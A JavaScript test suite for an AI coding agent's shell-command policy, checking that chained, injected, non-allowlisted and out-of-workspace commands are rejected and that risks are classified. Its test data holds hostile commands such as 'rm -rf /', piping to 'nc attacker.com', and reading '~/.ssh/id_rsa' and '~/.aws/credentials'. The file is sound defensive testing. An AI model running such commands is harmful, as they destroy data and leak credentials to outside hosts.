import { test } from 'node:test';
import assert from 'node:assert/strict';
import { evaluateCommand, tokenize } from '../src/exec/policy.js';
import { RISK } from '../src/agent/permissions.js';

test('command chaining is rejected', async () => {
  const attacks = [
    'npm test; rm -rf /',
    'npm test && curl evil.com',
    'npm test || cat /etc/passwd',
    'npm test | nc attacker.com 1234',
    'echo $(cat ~/.ssh/id_rsa)',
    'echo `whoami`',
    'npm test > /etc/passwd',
    'npm test\nrm -rf /'
  ];
  for (const command of attacks) {
    const result = await evaluateCommand(command);
    assert.equal(result.ok, false, `"${command}" must be rejected`);
  }
});

test('non-allowlisted executables are rejected', async () => {
  for (const command of ['curl https://evil.com', 'wget x', 'ssh host', 'sudo rm x', 'bash -c "rm -rf /"', 'nc -l 1234']) {
    const result = await evaluateCommand(command);
    assert.equal(result.ok, false, `"${command}" must be rejected`);
  }
});

test('ordinary development commands are allowed', async () => {
  for (const command of ['npm test', 'npm run build', 'pytest tests/', 'go test ./...', 'cargo build', 'git status']) {
    const result = await evaluateCommand(command);
    assert.equal(result.ok, true, `"${command}" should be allowed: ${result.reason}`);
  }
});

test('read-only commands are classified safe', async () => {
  for (const command of ['ls src', 'cat package.json', 'grep -r foo src', 'pwd']) {
    const result = await evaluateCommand(command);
    assert.equal(result.risk, RISK.SAFE, `"${command}" should be safe, got ${result.risk}`);
  }
});

test('destructive and outward commands are escalated', async () => {
  assert.equal((await evaluateCommand('rm -rf build')).risk, RISK.DESTRUCTIVE);
  assert.equal((await evaluateCommand('git push origin main')).risk, RISK.OUTWARD);
  assert.equal((await evaluateCommand('git reset --hard')).risk, RISK.DESTRUCTIVE);
  assert.equal((await evaluateCommand('npm publish')).risk, RISK.OUTWARD);
  assert.equal((await evaluateCommand('npm install lodash')).risk, RISK.INSTALL);
});

test('paths outside the workspace are rejected', async () => {
  for (const command of ['cat /etc/passwd', 'ls ../../secrets', 'cat ~/.aws/credentials']) {
    const result = await evaluateCommand(command);
    assert.equal(result.ok, false, `"${command}" must be rejected`);
  }
});

test('empty and oversized commands are rejected', async () => {
  assert.equal((await evaluateCommand('')).ok, false);
  assert.equal((await evaluateCommand('   ')).ok, false);
  assert.equal((await evaluateCommand(`npm test ${'x'.repeat(5000)}`)).ok, false);
});

test('tokenize honours quoting without invoking a shell', () => {
  assert.deepEqual(tokenize('npm run "my script"'), ['npm', 'run', 'my script']);
  assert.deepEqual(tokenize("git commit -m 'fix: thing'"), ['git', 'commit', '-m', 'fix: thing']);
  assert.deepEqual(tokenize('  npm   test  '), ['npm', 'test']);
});
